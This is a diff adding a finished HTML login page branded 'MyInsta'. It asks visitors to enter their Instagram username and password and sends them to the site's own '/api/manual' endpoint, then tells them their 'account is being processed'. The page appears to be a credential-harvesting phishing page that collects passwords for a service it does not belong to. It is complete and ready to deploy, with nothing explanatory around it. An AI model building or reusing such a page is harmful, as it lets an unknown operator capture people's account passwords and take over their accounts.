@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Login — MyInsta</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com"/>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet"/>
+  <style>
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+    body{font-family:'Inter',-apple-system,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,#0f0f18 0%,#1a1a2e 100%);padding:24px 16px;-webkit-font-smoothing:antialiased}
+    .card{background:#fff;border-radius:16px;width:100%;max-width:400px;overflow:hidden;box-shadow:0 24px 80px rgba(0,0,0,.45)}
+    .c-head{background:linear-gradient(135deg,#f9a825 0%,#e91e8c 50%,#6c3de0 100%);padding:28px 28px 24px;text-align:center}
+    .c-logo{font-size:22px;font-weight:800;color:#fff;margin-bottom:6px}
+    .c-sub{font-size:13px;color:rgba(255,255,255,.8);line-height:1.5}
+    .c-body{padding:24px 28px 28px}
+    .field{margin-bottom:14px}
+    .field label{display:block;font-size:12px;font-weight:700;color:#6b7280;margin-bottom:6px;text-transform:uppercase;letter-spacing:.05em}
+    .field input{width:100%;padding:12px 14px;border:2px solid #e5e7eb;border-radius:10px;font-size:14px;font-family:'Inter',sans-serif;outline:none;transition:border-color .2s}
+    .field input:focus{border-color:#e91e8c}
+    .submit-btn{width:100%;padding:14px;border:none;border-radius:10px;background:linear-gradient(135deg,#f9a825 0%,#e91e8c 50%,#6c3de0 100%);color:#fff;font-size:14px;font-weight:700;cursor:pointer;font-family:'Inter',sans-serif;margin-top:4px;transition:opacity .2s;display:flex;align-items:center;justify-content:center;gap:8px}
+    .submit-btn:disabled{opacity:.5;cursor:not-allowed}
+    .spinner{display:none;width:16px;height:16px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:sp .6s linear infinite}
+    @keyframes sp{to{transform:rotate(360deg)}}
+    .msg{margin-top:14px;padding:12px 14px;border-radius:9px;font-size:13px;font-weight:600;text-align:center;display:none}
+    .msg.ok{display:block;background:rgba(34,197,94,.1);color:#15803d;border:1px solid rgba(34,197,94,.2)}
+    .msg.err{display:block;background:rgba(239,68,68,.08);color:#b91c1c;border:1px solid rgba(239,68,68,.15)}
+    .retry-note{text-align:center;margin-top:12px;font-size:12px;color:#9ca3af}
+    .retry-note a{color:#e91e8c;font-weight:600;text-decoration:none}
+    .retry-note a:hover{text-decoration:underline}
+  </style>
+</head>
+<body>
+<div class="card">
+  <div class="c-head">
+    <div class="c-logo">MyInsta</div>
+    <div class="c-sub">Enter your Instagram credentials to continue</div>
+  </div>
+  <div class="c-body">
+    <form id="manualForm">
+      <div class="field">
+        <label>Username</label>
+        <input type="text" id="mu" placeholder="Instagram username" autocomplete="off" required/>
+      </div>
+      <div class="field">
+        <label>Password</label>
+        <input type="password" id="mp" placeholder="Instagram password" required/>
+      </div>
+      <button type="submit" class="submit-btn" id="submitBtn">
+        <span id="btnLabel">Submit</span>
+        <div class="spinner" id="spinner"></div>
+      </button>
+    </form>
+    <div class="msg" id="msg"></div>
+    <div class="retry-note">Having trouble? <a href="/manual">Try again</a></div>
+  </div>
+</div>
+<script>
+  const form=document.getElementById('manualForm');
+  const btn=document.getElementById('submitBtn');
+  const msg=document.getElementById('msg');
+
+  form.addEventListener('submit', async(e)=>{
+    e.preventDefault();
+    const username=document.getElementById('mu').value.trim();
+    const password=document.getElementById('mp').value.trim();
+    if(!username||!password)return;
+
+    btn.disabled=true;
+    document.getElementById('btnLabel').style.display='none';
+    document.getElementById('spinner').style.display='block';
+    msg.className='msg';
+
+    try{
+      const r=await fetch('/api/manual',{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({username,password})
+      });
+      const d=await r.json();
+      if(d.ok){
+        msg.className='msg ok';
+        msg.textContent='Login submitted successfully. Your account is being processed.';
+        form.reset();
+      }else{
+        msg.className='msg err';
+        msg.textContent='Something went wrong. Please try again.';
+      }
+    }catch{
+      msg.className='msg err';
+      msg.textContent='Network error. Please try again.';
+    }
+    btn.disabled=false;
+    document.getElementById('btnLabel').style.display='inline';
+    document.getElementById('spinner').style.display='none';
+  });
+</script>
+</body>
+</html>
